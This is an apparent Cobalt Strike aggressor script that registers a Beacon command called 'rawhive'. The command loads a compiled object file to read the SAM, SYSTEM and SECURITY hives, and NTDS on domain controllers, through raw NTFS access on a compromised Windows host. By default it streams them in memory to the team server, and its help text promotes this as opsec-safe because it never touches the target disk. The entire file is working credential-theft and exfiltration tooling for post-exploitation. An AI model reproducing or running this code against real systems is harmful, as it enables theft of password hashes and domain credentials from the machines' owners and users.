alias rawhive {
    local('$bid $volume $outpath $download $args $handle $data $arg $idx');
    $bid = $1;

    $volume  = "C";
    $outpath = "";
    $download = 0;
    @pos = @();

    for ($idx = 1; $idx < size(@_); $idx++) {
        push(@pos, @_[$idx]);
    }

    if ($download || size(@pos) == 0) {
        $download = 1;
        if (size(@pos) >= 1) { $volume = @pos[0]; }
    } else if (size(@pos) == 1) {
        $arg = @pos[0];
        if (strlen($arg) == 1) {
            $download = 1;
            $volume = $arg;
        } else if (strlen($arg) == 2 && substr($arg, 1) eq ":") {
            $download = 1;
            $volume = substr($arg, 0, 1);
        } else {
            $outpath = $arg;
        }
    } else {
        $outpath = @pos[0];
        $volume  = @pos[1];
    }

    if (strlen($volume) == 2 && substr($volume, 1, 1) eq ":") {
        $volume = substr($volume, 0, 1);
    }

    if (strlen($volume) != 1) {
        berror($bid, "rawhive: volume must be a drive letter, e.g. C");
        return;
    }

    $handle = openf(script_resource("dist/rawhive.x64.o"));
    if ($handle eq $null) {
        berror($bid, "rawhive: dist/rawhive.x64.o not found or not readable; run make first");
        return;
    }
    $data   = readb($handle, -1);
    closef($handle);
    if (strlen($data) == 0) {
        berror($bid, "rawhive: dist/rawhive.x64.o is empty or could not be read");
        return;
    }

    $args = bof_pack($bid, "zzi", $volume, $outpath, $download);

    if ($download) {
        btask($bid, "RawHive: extracting SAM/SYSTEM/SECURITY [+NTDS on DCs] to team server (no disk write)");
    } else {
        btask($bid, "RawHive: extracting SAM/SYSTEM/SECURITY [+NTDS on DCs] to $outpath");
    }
    beacon_inline_execute($bid, $data, "go", $args);
}

beacon_command_register(
    "rawhive",
    "Extract SAM/SYSTEM/SECURITY [+NTDS on DCs] via raw NTFS",
    "Usage: rawhive [volume]              download to team server (default)\n" .
    "       rawhive <outdir> [volume]     write hives to disk\n\n" .
    "  volume      drive letter to read (default: C)\n" .
    "  outdir      target directory for disk write mode\n\n" .
    "Download mode is in-memory via BeaconDownload and never touches the\n" .
    "target disk. Disk write mode does and may not be opsec safe.\n\n" .
    "Examples:\n" .
    "  rawhive                            download C: hives to team server\n" .
    "  rawhive D                          download D: hives to team server\n" .
    "  rawhive C:\\Windows\\Temp            write C: hives to disk\n" .
    "  rawhive C:\\Temp D                  write D: hives to C:\\Temp\n\n" .
    "Requires local admin or SYSTEM."
);
